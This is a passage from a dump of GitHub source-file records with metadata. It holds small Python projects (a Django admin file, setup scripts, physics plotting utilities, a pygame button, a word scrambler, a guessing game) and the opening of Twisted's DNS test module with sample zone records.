{"blob_id": "3b254832cad4fc4bc27dcc170f1c8ed0d5f196b5", "directory_id": "bad8e75945cd4b3b3e3644b4a0b182972f17f3ef", "path": "/simple_django_threadedcomments/blog/admin.py", "content_id": "fd6da1fddaf27a513b175ca08baa8ee53ded0069", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "jjh5030/simple-django-threadedcomments", "snapshot_id": "caef20402d366746ddcfbfb02f46d9d743ee3ad3", "revision_id": "f92bd117108bb765b0154d82c1c4d0bff80f8225", "branch_name": "refs/heads/master", "visit_date": "2020-05-20 16:03:35.446268", "revision_date": "2014-07-22 00:33:02", "committer_date": "2014-07-22 00:33:02", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "342", "extension": "py", "content": "from django.contrib import admin\nfrom .models import Post, ThreadedComment\n\n\nclass PostAdmin(admin.ModelAdmin):\n    class Meta:\n        model = Post\n\nadmin.site.register(Post, PostAdmin)\n\n\nclass ThreadedCommentAdmin(admin.ModelAdmin):\n    class Meta:\n        model = ThreadedComment\n\nadmin.site.register(ThreadedComment, ThreadedCommentAdmin)"}
{"blob_id": "6527a8759ac20f4eb2927cf3e143bfebcbff23e9", "directory_id": "5884f9efc9fdee04c5fb45fdc70252ed503ca0d0", "path": "/src/experiment/setup.py", "content_id": "1c590d2827646476d81ccb101e1ea843964e88d7", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "Dumbris/semantic-search-domain-adaptation", "snapshot_id": "30aa7891fae504f04649175efc8d959fa3e2aa64", "revision_id": "15512bb73d055faadf560d12f7827275d199aca4", "branch_name": "refs/heads/main", "visit_date": "2023-02-02 15:53:58.447027", "revision_date": "2020-12-24 14:33:48", "committer_date": "2020-12-24 14:33:48", "github_id": "314250807", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1464", "extension": "py", "content": "# coding: utf-8\nimport sys\n\nfrom setuptools import setup, find_packages\n\ninstall_requires = [\n    'numpy',\n    'pandas',\n    'spacy',\n    'rank_bm25',\n    'hydra-core',\n    'sentence_transformers', \n    'scipy',\n    'hnswlib',\n    'sklearn'\n]\n\nif sys.version_info < (2, 7):\n    install_requires.append('importlib')\n    install_requires.append('logutils')\n    install_requires.append('ordereddict')\n\nwith open('README.md') as f:\n    long_description = f.read()\n\nsetup(\n    name='experiment',\n    python_requires='>3.6.0',\n    version='1.0.1',\n    url='https://localhost',\n    license='Apache License 2.0',\n    description=('Package for search evaluation'),\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    packages=find_packages(exclude=['tests']),\n    include_package_data=True,\n    install_requires=install_requires,\n    extras_require={\n    },\n    zip_safe=False,\n    platforms='any',\n    classifiers=(\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n    ),\n    test_suite='tests',\n    entry_points = {\n        'console_scripts': [\n            'eval_encoder=experiment.eval_encoder:entry',\n            'eval_reranker=experiment.eval_reranker:entry',\n            'eval_bm25=experiment.eval_bm25:entry',\n            'eval_uset=experiment.eval_uset:entry'\n        ]\n    }\n)\n"}
{"blob_id": "4ed1b4b55bbe09dbfe2bfca03586a1ba2fdc0509", "directory_id": "b7f27ecc2566fa8f7c37a94a67e79db4fe49d35f", "path": "/13/xsilly", "content_id": "4bee8cb9374bcb367eb2c3faf7075b4f3c1e0714", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "lydiaauch/software-dev-2016", "snapshot_id": "c78cd9b8b4fd229eb4d4ac533a1ff92747342013", "revision_id": "30542fa663d13bfd1e32660ed1d9d0720ecc67b0", "branch_name": "refs/heads/master", "visit_date": "2021-01-17 17:38:44.219476", "revision_date": "2016-07-07 13:39:48", "committer_date": "2016-07-07 13:39:48", "github_id": "62809431", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "748", "extension": "", "content": "#! /usr/bin/env python\n\n\"\"\"\nA test harness for the Dealer feed1 method\n\"\"\"\n\nimport sys\nimport json\nfrom evolution.convert import Convert\nfrom evolution.choice  import Choice\nfrom evolution.player  import Player\n\ndef main():\n    message = sys.stdin.readlines()\n    json_choice = \"\"\n    for line in message:\n        json_choice += line.rstrip('\\n')\n    json_choice = json.loads(json_choice)\n    try:\n        player = Convert.json_to_player(json_choice[0])\n        choice = Convert.json_to_choice(json_choice[1:])\n        strategy = Player()\n        strategy.start(player)\n        action = strategy.choose(choice)\n        print json.dumps(Convert.action_to_json(action))\n    except AssertionError:\n        pass\n\n\nif __name__ == \"__main__\":\n    main()\n"}
{"blob_id": "ba634fe3d6e7d777d2953de845361b551d846cb7", "directory_id": "950fccfd33792c8df95fb25e7eae3eb14fcb4a62", "path": "/master_eq/utils.py", "content_id": "8e5d62e0cf5ccfeccb2c7fbdb280bc94428d59db", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "Zhangxudong93/laser_entropy", "snapshot_id": "022a30817f734033754b72ff9ee30bab5e3b00cd", "revision_id": "4e5ff050611c4bb6acf27ededc18b76609bd3f05", "branch_name": "refs/heads/master", "visit_date": "2021-12-16 06:06:29.747215", "revision_date": "2017-09-14 09:18:37", "committer_date": "2017-09-14 09:18:37", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "8709", "extension": "py", "content": "#!/usr/bin/env python\n\n\"\"\"Utility functions for saving/reading data and plotting figures.\"\"\"\n\nfrom datetime import datetime\n\nimport numpy as np\nimport pandas as pd\nimport matplotlib.pyplot as plt\nimport seaborn as sns\n\nfrom scipy.special import erfc\n\n# from multiprocessing import Pool\n# from multiprocessing.dummy import Pool as ThreadPool\n\nfrom qutip import *\nimport master_eq\n\n\n__author__ = 'Longfei Fan'\n__version__ = '1.0'\n__status__ = 'Development'\n__date__ = '08/18/2017'\n\n\ndef df_plot(df, xaxis, columns, xlim, xlabel, ylabel, title, style, loc=0,\\\n            entr_cohe=False, entr_thml=False):\n    \"\"\"\n    plot dataframe with multiple columns\n    \"\"\"\n    df.loc[:, columns].plot(x=xaxis, xlim=xlim, style=style, \n        figsize=(6, 4), fontsize=14)\n    plt.xlabel(xlabel, fontsize=14)\n    plt.ylabel(ylabel, fontsize=14)\n    plt.title(title, fontsize=14)\n    plt.legend(fontsize=14, loc=loc)\n\n    if entr_thml:\n        plt.axhline(y=entr_thml, color='black', linewidth=0.5, \\\n                    linestyle='--', label='thermal')\n    if entr_cohe:\n        plt.axhline(y=entr_cohe, color='red', linewidth=0.5, \\\n                    linestyle='-', label='coherent')\n\n\ndef plot_pn_vs_time(state, indics, title, x1, x2, y1, y2, factor):\n    \"\"\" plot photon statistics with respect to time\n        state: MasterEq object\n        indics: time point to be plotted\n        title: figure title\n        x1, x2: xlim\n        y1, y2: ylim\n    \"\"\"\n    N_max = state.N_max\n    t_list = state.t_list\n    pns_vs_t = state.get_pns()\n\n    lstyle = ['-', '--', ':', '-.', '-', '--']\n\n    fig, ax = plt.subplots(sharex=True, figsize=(10, 4))\n    for i, index in enumerate(indics):\n        ax.plot(np.arange(N_max), pns_vs_t[index], linestyle=lstyle[i], \n            linewidth=2, label='{:.4f}'.format(t_list[index] *factor))\n        \n    ax.set_xlim(x1, x2)\n    ax.set_ylim(y1, y2)\n    ax.set_xlabel(r'$n$', fontsize=14)\n    ax.set_ylabel(r'$p_n$', fontsize=14)\n    ax.tick_params(labelsize=14)\n    ax.legend(fontsize=14)\n    plt.title(title, fontsize=14);\n\n\ndef calc_entr_vec(mean, varn):\n    \"\"\" Calculate the vector of entropy \n        given on the vector of the mean and the variance\n    \"\"\"\n    result = np.log(np.sqrt(2.0 * np.pi * varn)) + 0.5\n    result +=  np.log(0.5 * erfc(- mean / np.sqrt(2.0 * varn)))\n    nn = - mean * np.exp(- mean**2 / 2.0 / varn) \n    dd = np.sqrt(2.0 * np.pi * varn) * erfc(- mean / np.sqrt(2.0 * varn))\n    result += nn / dd\n    result = np.insert(result, 0, 0)\n    return result\n\n\ndef get_entr_approx(state):\n    pns_all = state.get_pns()[1:]\n    mean_all = np.array(state.get_nbars())[1:]\n    N_max = state.N_max\n    \n    var_n_all = []\n    for pns in pns_all:\n        aver_n = sum([pns[i] * i for i in range(N_max)])\n        aver_n2 = sum([pns[i] * i**2 for i in range(N_max)])\n        var_n_all.append(aver_n2 - aver_n**2)\n       \n    result = calc_entr_vec(mean_all, np.array(var_n_all))\n    # result[result < 0] = 0\n    return result\n\n\ndef plot_varn_entr(df, col1, col2, x1, x2):\n    fig, ax = plt.subplots()\n    t_list = df['$\\kappa t$'][x1:x2]\n    entr = df[col1][x1:x2]\n    entr_approx = df[col2][x1:x2]\n    \n    ax.plot(t_list, entr_approx, linestyle='--', label='approx')\n    ax.plot(t_list, entr, linestyle='-', label ='exact')\n    ax.plot(t_list, entr - entr_approx, linestyle='-.', label ='difference')\n    ax.set_xlabel('$time$', fontsize=14)\n    ax.set_ylabel('$S$', fontsize=14)\n    ax.legend(fontsize=14, loc=0)\n    ax.set_title(\"Entropy for \" + col1)\n\n\ndef save_cnb_to_csv(cnb1, cnb2, N, t_list, kappa):\n    \"\"\"\n    save nbar, entropy, and final pn of cnb1 and cnb2 into csv\n    \"\"\"\n    n_dict = {'$\\kappa t$': t_list * kappa}\n    entr_dict = {'$\\kappa t$': t_list * kappa}\n    pn_dict = {'n': np.arange(N + 1)}\n\n    n_dict['CNB I'] = cnb1.get_nbars()\n    n_dict['CNB II'] = cnb2.get_nbars()\n    entr_dict['CNB I'] = cnb1.get_entrs()\n    entr_dict['CNB II'] = cnb2.get_entrs()\n    pn_dict['CNB I'] = cnb1.get_pns()[-1]\n    pn_dict['CNB II'] = cnb2.get_pns()[-1]\n\n    entr_dict['I Approx'] = get_entr_approx(cnb1)\n    entr_dict['II Approx'] = get_entr_approx(cnb2)\n    entr_dict['I Diff'] = entr_dict['CNB I'] - entr_dict['I Approx']\n    entr_dict['II Diff'] = entr_dict['CNB II'] - entr_dict['II Approx']\n\n    n_df = pd.DataFrame(n_dict, columns=n_dict.keys())\n    entr_df = pd.DataFrame(entr_dict, columns=entr_dict.keys())\n    pn_df = pd.DataFrame(pn_dict, columns=pn_dict.keys())\n\n    n_df.to_csv('./data/cnb_n_df.csv', index=False)\n    entr_df.to_csv('./data/cnb_entr_df.csv', index=False)\n    pn_df.to_csv('./data/cnb_pn_df.csv', index=False)\n\n\ndef read_cnb_from_csv(path, state_name):\n    \"\"\"\n    read nbar, entropy, and final pn of cnb1 and cnb2 from csv\n    \"\"\"\n    n_df = pd.read_csv(path + state_name + '_n_df.csv')\n    entr_df = pd.read_csv(path + state_name + '_entr_df.csv')\n    pn_df = pd.read_csv(path + state_name + '_pn_df.csv')\n    return n_df, entr_df, pn_df\n\n\n\n\n\n# def entropy_vs_ratio(ratios, t_list, g, kappa, nbar, N_max, init_psi, solver='pn'):\n#     \"\"\" simulate lasers with different A/C ratios\n#     \"\"\"\n#     def get_para(alpha, nbar, kappa, g):\n#         \"\"\" calculate parameters given on ratio, nbar, kappa, and g\n#         \"\"\"\n#         gamma = np.sqrt(nbar / (alpha - 1)) * 2 * g\n#         ra = 2 * kappa * nbar * alpha / (alpha - 1)\n#         return {'g': g, 'gamma': gamma, 'C': kappa, 'ra': ra,\n#                 'A': 2 * ra * g**2 / gamma**2, 'B': 8 * ra * g**4 / gamma**4}\n    \n#     # step = round(len(t_list) / 100)\n#     n_dict = {'gt': t_list * g}\n#     entr_dict = {'gt': t_list * g}\n#     l_dict = {}\n\n#     for alpha in ratios:\n#         paras = get_para(alpha, nbar, kappa, g)\n#         g, ra, gamma, kappa = paras['g'], paras['ra'], paras['gamma'], paras['C']\n\n#         print(str(datetime.now()))\n#         print('ratio: {:>5.2f}, ra: {:3.4f}, A: {:.3e}, C: {:.3e}, B: {:.3e}\\n'. \\\n#               format(alpha, ra, paras['A'], kappa, paras['B']))\n#         l = laser.LaserOneMode(g, ra, gamma, kappa)\n#         if solver == 'pn':\n#             l.pn_evolve(init_psi, N_max, t_list)\n#         elif solver == 'rho':\n#             l.rho_evolve(init_psi, N_max, t_list)\n        \n#         key = '{:.2f}'.format(alpha)\n#         l_dict[key] = l\n#         n_dict[key] = l.get_ns()\n#         entr_dict[key] = l.get_entrs()\n\n#     print(str(datetime.now()))\n\n#     return l_dict, n_dict, entr_dict\n\n\n# def evolution(alpha, t_list, g, kappa, nbar, N_max, init_psi, solver):\n#     \"\"\"\n#     \"\"\"\n#     paras = get_para(alpha, nbar, kappa, g)\n#     g, ra, gamma, kappa = paras['g'], paras['ra'], paras['gamma'], paras['C']\n#     print('ratio: {:>5.2f}, ra: {:3.4f}, A: {:.3e}, C: {:.3e}, B: {:.3e}'. \\\n#           format(alpha, ra, paras['A'], kappa, paras['B']))\n#     l = laser.LaserOneMode(g, ra, gamma, kappa)\n#     if solver == 'pn':\n#         l.pn_evolve(init_psi, N_max, t_list)\n#     elif solver == 'rho':\n#         l.rho_evolve(init_psi, N_max, t_list)\n#     key = '{:.2f}'.format(alpha)\n    \n#     return key, l\n\n\n# def entropy_vs_ratio(ratios, t_list, g, kappa, nbar, N_max, init_psi, solver='pn'):\n#     \"\"\" simulate lasers with different A/C ratios\n#     \"\"\"\n#     n_dict = {'gt': t_list * g}\n#     entr_dict = {'gt': t_list * g}\n#     l_array = []\n\n#     for alpha in ratios:\n#         key, l = evolution(alpha, t_list, g, kappa, nbar, N_max, init_psi, solver)\n        \n#         l_array.append([key, l])\n#         n_dict[key] = l.get_ns()\n#         entr_dict[key] = l.get_entrs()\n\n#     return l_array, n_dict, entr_dict\n\n\n# def entropy_vs_ratio(ratios, t_list, g, kappa, nbar, N_max, init_psi, solver='pn'):\n#     \"\"\" simulate lasers with different A/C ratios\n#     \"\"\"\n#     l_array = [evolution(alpha, t_list, g, kappa, nbar, N_max, init_psi, solver) for alpha in ratios]\n    \n#     n_dict = {'gt': t_list * g}\n#     entr_dict = {'gt': t_list * g}\n#     for key, l in l_array:\n#         n_dict[key] = l.get_ns()\n#         entr_dict[key] = l.get_entrs()\n\n#     return l_array, n_dict, entr_dict\n\n\n# test for multi-processing\n# def entropy_vs_ratio(ratios, t_list, g, kappa, nbar, N_max, init_psi, solver='pn'):\n#     \"\"\" simulate lasers with different A/C ratios\n#     \"\"\"\n#     def evolution_wrapper(alpha):\n#         return evolution(alpha, t_list, g, kappa, nbar, N_max, init_psi, solver)\n    \n#     l_array = list(map(evolution_wrapper, ratios))\n    \n#     # pool = ThreadPool(4)\n#     # l_array = list(pool.map(evolution_wrapper, ratios))\n#     # pool.close()\n#     # pool.join()\n    \n#     n_dict = {'gt': t_list * g}\n#     entr_dict = {'gt': t_list * g}\n#     for key, l in l_array:\n#         n_dict[key] = l.get_ns()\n#         entr_dict[key] = l.get_entrs()\n\n#     return l_array, n_dict, entr_dict\n   \n\n"}
{"blob_id": "2c7e1af7be7fc0e028d39a61eaecff78f3e51fbf", "directory_id": "76e62ddbfdfba19c80b37e855a4df67672ef0808", "path": "/PINp/2015/GOLOVIN_A_I/task_6_7.py", "content_id": "f44cf765622b99a9db68592a554beeabdd89cf01", "detected_licenses": "['Apache-2.0']", "license_type": "permissive", "repo_name": "stasvorosh/pythonintask", "snapshot_id": "9d30f3cd492e89783b7221402375c1ebe4690baa", "revision_id": "8169ed26510022fe0d589f4013f11749131957df", "branch_name": "refs/heads/master", "visit_date": "2021-01-17 16:49:32.778063", "revision_date": "2016-10-10 14:08:04", "committer_date": "2016-10-10 14:08:04", "github_id": "52255539", "star_events_count": "6", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "2016-02-22 07:33:16", "gha_created_at": "2016-02-22 07:33:15", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "812", "extension": "py", "content": "\ufeff# \u0417\u0430\u0434\u0430\u0447\u0430 6. \u0412\u0430\u0440\u0438\u0430\u043d\u0442 7.\n# \u0421\u043e\u0437\u0434\u0430\u0439\u0442\u0435 \u0438\u0433\u0440\u0443, \u0432 \u043a\u043e\u0442\u043e\u0440\u043e\u0439 \u043a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440 \u0437\u0430\u0433\u0430\u0434\u044b\u0432\u0430\u0435\u0442 \u0438\u043c\u044f \u043e\u0434\u043d\u043e\u0433\u043e \u0438\u0437 \u0434\u0432\u0443\u0445 \u0441\u043e\u043e\u0441\u043d\u043e\u0432\u0430\u0442\u0435\u043b\u0435\u0439 \u043a\u043e\u043c\u043f\u0430\u043d\u0438\u0438 #Google, \u0430 \u0438\u0433\u0440\u043e\u043a \u0434\u043e\u043b\u0436\u0435\u043d \u0435\u0433\u043e \u0443\u0433\u0430\u0434\u0430\u0442\u044c.\n\n# Golovin A.I.\n# 02.06.2016\n\nimport random\n\navtori = (\"\u041b\u0430\u0440\u0440\u0438 \u041f\u0435\u0439\u0434\u0436\", \"\u0421\u0435\u0440\u0433\u0435\u0439 \u041c\u0438\u0445\u0430\u0439\u043b\u043e\u0432\u0438\u0447 \u0411\u0440\u0438\u043d\")\nzagadka = random.choice(avtori)\npredpologenie = input(\"\u041f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0430 \u0437\u0430\u0433\u0430\u0434\u0430\u043b\u0430 \u043e\u0434\u043d\u043e\u0433\u043e \u0438\u0437 \u043e\u0441\u043d\u043e\u0432\u0430\u0442\u0435\u043b\u0435\u0439 \u0433\u0443\u0433\u043b\\n\u0412\u0430\u0448\u0435 \u043f\u0440\u0435\u0434\u043f\u043e\u043b\u043e\u0436\u0435\u043d\u0438\u0435: \")\nif predpologenie.lower() == zagadka.lower():\n    print(\"\u0425\u0410\u0410\u0410\u0410\u0410\u0410\u0410\u0410\u0420\u041e\u041e\u041e\u041e\u041e\u041e\u041e\u041e\u0428\")\nelse:\n    print (\"\u041d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e\\n\u041f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043e\u0442\u0432\u0435\u0442 - \" + zagadka)\n\ninput(\"\\n\\n\u0412\u0432\u0435\u0434\u0438\u0442\u0435 ENTER \u0434\u043b\u044f \u0432\u044b\u0445\u043e\u0434\u0430\")\n"}
{"blob_id": "6aae82cfa89fb3c74068eb74dc27dc41906eda3e", "directory_id": "c846d11074d2f3409ac858c69eff79d593edb952", "path": "/button.py", "content_id": "36100f4ce4d8dea94564bcdf594719578c4658ae", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "Kameroi/Alien_invasion", "snapshot_id": "e1aea4c125e43556db4158da9035b2e72b1cae70", "revision_id": "f1a766ab20a814e3a6b40a9bb1573941cee1c8cd", "branch_name": "refs/heads/master", "visit_date": "2020-08-23 13:30:15.850938", "revision_date": "2019-10-24 14:43:59", "committer_date": "2019-10-24 14:43:59", "github_id": "216627223", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "2019-10-24 14:43:34", "gha_created_at": "2019-10-21 17:33:47", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1308", "extension": "py", "content": "import pygame.ftfont\r\n\r\nclass Button:\r\n    def __init__(self, ai_game, msg):\r\n        \"\"\"Initialize button attributes.\"\"\"\r\n\r\n        self.screen = ai_game.screen\r\n        self.screen_rect = self.screen.get_rect()\r\n\r\n        # Set the dimensions and properties of the button.\r\n        self.width, self.height = 200, 50\r\n        self.button_color = (0, 255, 0)\r\n        self.text_color = (255, 255, 255)\r\n        self.font = pygame.font.SysFont(None, 48)\r\n\r\n        # Build the button's rect object and center it.\r\n        self.rect = pygame.Rect(0, 0, self.width, self.height)\r\n        self.rect.center = self.screen_rect.center\r\n\r\n        # The button message needs to be prepped only once.\r\n        self._prep_msg(msg)\r\n\r\n    def _prep_msg(self, msg):\r\n        \"\"\"Turn msg into a rendered image and center text on the button.\"\"\"\r\n        self.msg_image = self.font.render(msg, True, self.text_color,\r\n                                          self.button_color)\r\n        self.msg_image_rect = self.msg_image.get_rect()\r\n        self.msg_image_rect.center = self.rect.center\r\n\r\n    def draw_button(self):\r\n        # Draw blank button and then draw message.\r\n        self.screen.fill(self.button_color, self.rect)          # check what is .fill()\r\n        self.screen.blit(self.msg_image, self.msg_image_rect)"}
{"blob_id": "5b3807a713f63a7cb6acd94e05d81cd47e243d4e", "directory_id": "4413c4521c2a2000527beacc12bbf4a90a626956", "path": "/setup.py", "content_id": "26775ed440a7bfca2e2b9948a9c7255e276e3233", "detected_licenses": "['Apache-2.0']", "license_type": "permissive", "repo_name": "raquelalegre/xclim", "snapshot_id": "589ef75192a12f893481c2eac0f423571d95d6a5", "revision_id": "6102e542e6e08072a60879d6200f9340207cd50e", "branch_name": "refs/heads/master", "visit_date": "2023-06-23 01:36:49.451657", "revision_date": "2021-07-14 20:04:24", "committer_date": "2021-07-14 20:04:24", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2749", "extension": "py", "content": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\"\"\"The setup script.\"\"\"\nfrom setuptools import find_packages, setup\n\nNAME = \"xclim\"\nDESCRIPTION = \"Derived climate variables built with xarray.\"\nURL = \"https://github.com/Ouranosinc/xclim\"\nAUTHOR = \"Travis Logan\"\nAUTHOR_EMAIL = \"logan.travis@ouranos.ca\"\nREQUIRES_PYTHON = \">=3.7.0\"\nVERSION = \"0.28.0\"\nLICENSE = \"Apache Software License 2.0\"\n\nwith open(\"README.rst\") as readme_file:\n    readme = readme_file.read()\n\nwith open(\"HISTORY.rst\") as history_file:\n    history = history_file.read()\n\nrequirements = [\n    \"numpy>=1.16\",\n    \"xarray>=0.17\",\n    \"scipy>=1.2\",\n    \"numba\",\n    \"pandas>=0.23,<1.3\",\n    \"cftime>=1.4.1\",\n    \"dask[array]>=2.6\",\n    \"pint>=0.9\",\n    \"bottleneck~=1.3.1\",\n    \"boltons>=20.1\",\n    \"scikit-learn>=0.21.3\",\n    \"Click\",\n    \"packaging>=20.0\",\n    \"pyyaml\",\n    \"jsonpickle\",\n]\n\nsetup_requirements = [\"pytest-runner\", \"wheel\"]\n\ntest_requirements = [\"pytest\", \"tox\", \"xdoctest\", \"pooch\"]\n\ndocs_requirements = [\n    \"sphinx\",\n    \"sphinx-rtd-theme\",\n    \"nbsphinx\",\n    \"ipython\",\n    \"ipykernel\",\n    \"jupyter_client\",\n    \"matplotlib\",\n    \"netCDF4\",\n    \"nc-time-axis\",\n    \"distributed>=2.0\",\n    \"pooch\",\n]\n\ngis_requirements = [\"clisops>=0.4.0\"]\n\ndev_requirements = []\nwith open(\"requirements_dev.txt\") as dev:\n    for dependency in dev.readlines():\n        dev_requirements.append(dependency)\n\nKEYWORDS = \"xclim climate climatology netcdf gridded analysis\"\n\nsetup(\n    author=AUTHOR,\n    author_email=AUTHOR_EMAIL,\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Science/Research\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Topic :: Scientific/Engineering :: Atmospheric Science\",\n    ],\n    description=DESCRIPTION,\n    python_requires=REQUIRES_PYTHON,\n    install_requires=requirements,\n    license=LICENSE,\n    long_description=readme + \"\\n\\n\" + history,\n    long_description_content_type=\"text/x-rst\",\n    include_package_data=True,\n    keywords=KEYWORDS,\n    name=NAME,\n    packages=find_packages(),\n    setup_requires=setup_requirements,\n    test_suite=\"tests\",\n    tests_require=test_requirements,\n    entry_points=\"\"\"\n        [console_scripts]\n        xclim=xclim.cli:cli\n    \"\"\",\n    extras_require={\n        \"docs\": docs_requirements,\n        \"dev\": dev_requirements,\n        \"gis\": gis_requirements,\n    },\n    url=URL,\n    version=VERSION,\n    zip_safe=False,\n)\n"}
{"blob_id": "a86797dd8eadb4c5db0bb3e50a7d8c7b5eae28c1", "directory_id": "9c486bfde2ad6a53cb13597b0a795e8f7de4d891", "path": "/Individual Modules/wordScrambler.py", "content_id": "27f54b6a873ef70c23959b424e43915d8403550c", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "sakib-shahriyar/Word-Scrambler", "snapshot_id": "707f0085cc13759741c1d567503d420fae0fb3da", "revision_id": "e7829f273da70e03f5b415c9dcc2b63fe1b4f59b", "branch_name": "refs/heads/master", "visit_date": "2021-05-08 03:57:45.966722", "revision_date": "2017-11-06 15:07:47", "committer_date": "2017-11-06 15:07:47", "github_id": "108250978", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "2017-10-25 10:28:54", "gha_created_at": "2017-10-25 09:49:37", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "446", "extension": "py", "content": "import random\r\n\r\nf = open('scrumbler.txt','r')\r\n\r\nmessage = f.read()\r\n\r\nf.close()\r\n\r\ndef __split__ (message):\r\n\r\n\tmessage = message.strip()\r\n\tword = message.splitlines()\r\n\r\n\tf = open('scrumbled_done.txt','w')\r\n\tfor item in range(len(word)):\r\n\t\ttext = list(word[item])\r\n\t\trandom.shuffle(text)\r\n\t\tshuffled_word = \"\".join(text)\r\n\t\t#print shuffled_word\r\n\r\n\t\tmessage = f.write(shuffled_word + \" \")\r\n\t\t\r\n\t#print text\r\n\tf.close()\r\n\r\n__split__(message)\r\n"}
{"blob_id": "318093ab4b9cf1a820e3d9e389d529875df1f23e", "directory_id": "097a7cb751a7c5b311b11fea60278081c751dcc1", "path": "/src/twisted/names/test/test_names.py", "content_id": "a1672c64f0a02f411846a0c3b27c1d58c2537a44", "detected_licenses": "['LicenseRef-scancode-unknown-license-reference', 'MIT', 'LicenseRef-scancode-public-domain']", "license_type": "permissive", "repo_name": "dchenk/twisted", "snapshot_id": "b12449d968804ebd832d4a814e3fc858420b0e51", "revision_id": "4a0ac6edba947c77ea95085e75f5b7bc7ddffb12", "branch_name": "refs/heads/master", "visit_date": "2021-07-24 15:59:39.735816", "revision_date": "2020-08-24 23:12:15", "committer_date": "2020-08-24 23:12:15", "github_id": "211361245", "star_events_count": "0", "fork_events_count": "1", "gha_license_id": "NOASSERTION", "gha_event_created_at": "2019-10-02 18:36:33", "gha_created_at": "2019-09-27 16:34:31", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "47789", "extension": "py", "content": "# Copyright (c) Twisted Matrix Laboratories.\n# See LICENSE for details.\n\n\"\"\"\nTest cases for twisted.names.\n\"\"\"\n\n\nimport copy\nimport operator\nimport socket\n\nfrom io import BytesIO\nfrom functools import partial, reduce\nfrom struct import pack\n\nfrom twisted.trial import unittest\n\nfrom twisted.internet import reactor, defer, error\nfrom twisted.internet.defer import succeed\nfrom twisted.names import client, server, common, authority, dns\nfrom twisted.names.dns import (\n    SOA, Message, RRHeader, Record_A, Record_SOA, Query)\nfrom twisted.names.error import DomainError\nfrom twisted.names.client import Resolver\nfrom twisted.names.secondary import (\n    SecondaryAuthorityService, SecondaryAuthority)\nfrom twisted.python.compat import nativeString\nfrom twisted.python.filepath import FilePath\n\nfrom twisted.test.proto_helpers import (\n    StringTransport, MemoryReactorClock, waitUntilAllDisconnected)\n\ndef justPayload(results):\n    return [r.payload for r in results[0]]\n\nclass NoFileAuthority(authority.FileAuthority):\n    def __init__(self, soa, records):\n        # Yes, skip FileAuthority\n        common.ResolverBase.__init__(self)\n        self.soa, self.records = soa, records\n\n\nsoa_record = dns.Record_SOA(\n                    mname = b'test-domain.com',\n                    rname = u'root.test-domain.com',\n                    serial = 100,\n                    refresh = 1234,\n                    minimum = 7654,\n                    expire = 19283784,\n                    retry = 15,\n                    ttl=1\n                )\n\nreverse_soa = dns.Record_SOA(\n                     mname = b'93.84.28.in-addr.arpa',\n                     rname = b'93.84.28.in-addr.arpa',\n                     serial = 120,\n                     refresh = 54321,\n                     minimum = 382,\n                     expire = 11193983,\n                     retry = 30,\n                     ttl=3\n                )\n\nmy_soa = dns.Record_SOA(\n    mname = u'my-domain.com',\n    rname = b'postmaster.test-domain.com',\n    serial = 130,\n    refresh = 12345,\n    minimum = 1,\n    expire = 999999,\n    retry = 100,\n    )\n\ntest_domain_com = NoFileAuthority(\n    soa = (b'test-domain.com', soa_record),\n    records = {\n        b'test-domain.com': [\n            soa_record,\n            dns.Record_A(b'127.0.0.1'),\n            dns.Record_NS(b'39.28.189.39'),\n            dns.Record_SPF(b'v=spf1 mx/30 mx:example.org/30 -all'),\n            dns.Record_SPF(b'v=spf1 +mx a:\\0colo',\n                           b'.example.com/28 -all not valid'),\n            dns.Record_MX(10, u'host.test-domain.com'),\n            dns.Record_HINFO(os=b'Linux', cpu=b'A Fast One, Dontcha 